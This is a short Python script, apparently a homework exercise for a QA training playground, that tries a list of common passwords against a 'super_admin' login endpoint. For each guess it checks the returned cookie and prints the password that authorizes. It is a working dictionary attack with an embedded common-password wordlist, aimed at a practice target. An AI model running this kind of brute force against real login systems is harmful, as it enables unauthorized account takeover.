import requests
import json

get_pass_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_cookie_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

password = ['password','123456','123456789','12345678','12345','qwerty','abc123','football','1234567','monkey','111111','letmein','1234','1234567890','dragon','baseball','sunshine','iloveyou','trustno1','princess','adobe123[a]','123123','welcome','login','admin','qwerty123','solo','1q2w3e4r','master','666666','photoshop[a]','1qaz2wsx','qwertyuiop','ashley','mustang','121212','starwars','654321','bailey','access','flower','555555','passw0rd','shadow','lovely','7777777','michael','!@#$%^&*','jesus','password1','superman','hello','charlie','888888','696969','hottie','freedom','aa123456','qazwsx','ninja','azerty','loveme','whatever','donald','batman','zaq1zaq1','Football','000000','123qwe']
#get_pass = requests.post(get_pass_url, data={'login':'super_admin','password':'123'})

for passwd in password:
    #1. Отправляем запрос на get_secret_password_homework, получаем из него cookie
    get_pass = requests.post(get_pass_url, data={'login':'super_admin','password':passwd})
    #2. Отправляем запрос на check_auth_cookie, проверяем ответ
    check_cookie = requests.post(check_cookie_url, cookies=get_pass.cookies)
    if check_cookie.text == "You are authorized":
        print(check_cookie.text)
        print(f'Ваш пароль: {passwd}')
        #3. Пробуем зайти с полученным паролем
        check_pass = requests.post(get_pass_url, data={'login': 'super_admin', 'password': passwd})
        print(check_pass.text)
        break

